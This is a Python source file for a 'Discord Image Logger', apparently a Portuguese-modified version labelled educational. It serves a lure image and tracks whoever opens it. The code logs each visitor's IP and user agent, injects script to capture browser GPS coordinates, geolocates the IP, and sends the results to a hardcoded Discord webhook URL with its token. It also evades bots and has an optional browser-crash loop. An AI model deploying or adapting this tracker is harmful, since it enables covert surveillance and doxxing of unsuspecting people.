# Discord Image Logger (Geolocalização Aprimorada)
# By DeKrypt | Modificado para fins educacionais

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.1"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1342206713813667992/ZrCTV80NToSOpDcxy7KXmUB6wIlwYfTsKwGoGADV91vLagXObWDzp9csNQbmCmAUe04G",
    "image": "https://i1.sndcdn.com/artworks-000349102620-mufv3v-t500x500.jpg",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPÇÕES ATUALIZADAS #
    "accurateLocation": True,  # GPS habilitado
    "crashBrowser": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"```\n{error}\n```",
        }],
    })

# FUNÇÃO PRINCIPAL MODIFICADA AQUI ↓
def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "embeds": [{
                "title": "Image Logger - Link Sent",
                "color": config["color"],
                "description": f"**Link enviado em:** `{endpoint}`\n**IP:** `{ip}`\n**Plataforma:** `{bot}`",
            }],
        }) if config["linkAlerts"] else None
        return

    # NOVO: Sistema de geolocalização híbrido
    location_info = {"type": "IP", "coords": "N/A", "map": "N/A"}
    try:
        if coords:
            lat, lon = coords.split(',')
            location_info.update({
                "type": "GPS",
                "coords": coords,
                "map": f"https://www.google.com/maps/place/{lat}+{lon}",
                "accuracy": "Preciso"
            })
        else:
            ip_data = requests.get(f"http://ip-api.com/json/{ip}?fields=lat,lon,city,country,isp", timeout=10).json()
            location_info.update({
                "coords": f"{ip_data.get('lat', 'N/A')}, {ip_data.get('lon', 'N/A')}",
                "map": f"https://www.google.com/maps?q={ip_data.get('lat',0)},{ip_data.get('lon',0)}",
                "accuracy": "Aproximado",
                "city": ip_data.get("city", "N/A"),
                "country": ip_data.get("country", "N/A"),
                "isp": ip_data.get("isp", "N/A")
            })
    except Exception as e:
        reportError(f"Erro na geolocalização: {str(e)}")

    # Construção do embed
    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    embed = {
        "username": config["username"],
        "embeds": [{
            "title": "📍 Novo Acesso Detectado",
            "color": config["color"],
            "fields": [
                {"name": "🌐 IP", "value": f"```{ip}```", "inline": False},
                {"name": "📌 Localização", "value": f"**Tipo:** {location_info['type']} ({location_info['accuracy']})\n**Coordenadas:** [{location_info['coords']}]({location_info['map']})", "inline": False},
                {"name": "🏙️ Cidade", "value": location_info.get("city", "N/A"), "inline": True},
                {"name": "🌍 País", "value": location_info.get("country", "N/A"), "inline": True},
                {"name": "🖥️ Sistema", "value": f"{os} | {browser}", "inline": False},
            ],
            "footer": {"text": f"User Agent: {useragent}" if useragent else ""}
        }]
    }
    if url: embed["embeds"][0]["thumbnail"] = {"url": url}
    requests.post(config["webhook"], json=embed)

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            url = config["image"]
            if config["imageArgument"]:
                query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
                if query.get("url") or query.get("id"):
                    url = base64.b64decode((query.get("url") or query.get("id")).encode()).decode()

            data = f'''<style>body {{margin:0;padding:0;}}
                    div.img {{background-image:url('{url}');background-size:contain;width:100vw;height:100vh;}}</style>
                    <div class="img"></div>'''.encode()

            ip = self.headers.get('x-forwarded-for')
            if ip.startswith(blacklistedIPs) or botCheck(ip, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]: 
                    self.wfile.write(binaries["loading"])
                return

            # Captura GPS
            coords = None
            if config["accurateLocation"]:
                query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
                if query.get("g"):
                    coords = base64.b64decode(query["g"].encode()).decode()
                else:
                    data += b"""<script>
                        navigator.geolocation.getCurrentPosition(p => {
                            const coord = btoa(p.coords.latitude + ',' + p.coords.longitude).replace(/=/g, '%3D');
                            window.location.href.includes('?') 
                                ? window.location.href += '&g=' + coord 
                                : window.location.href += '?g=' + coord;
                        });
                    </script>"""

            makeReport(ip, self.headers.get('user-agent'), coords, self.path.split("?")[0], url)
            
            if config["message"]["doMessage"]:
                data = config["message"]["message"].encode()
            
            if config["crashBrowser"]:
                data += b'<script>setTimeout(()=>{for(;;)Array(1e5)},100)</script>'
            
            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(data)

        except Exception as e:
            self.send_response(500)
            self.end_headers()
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
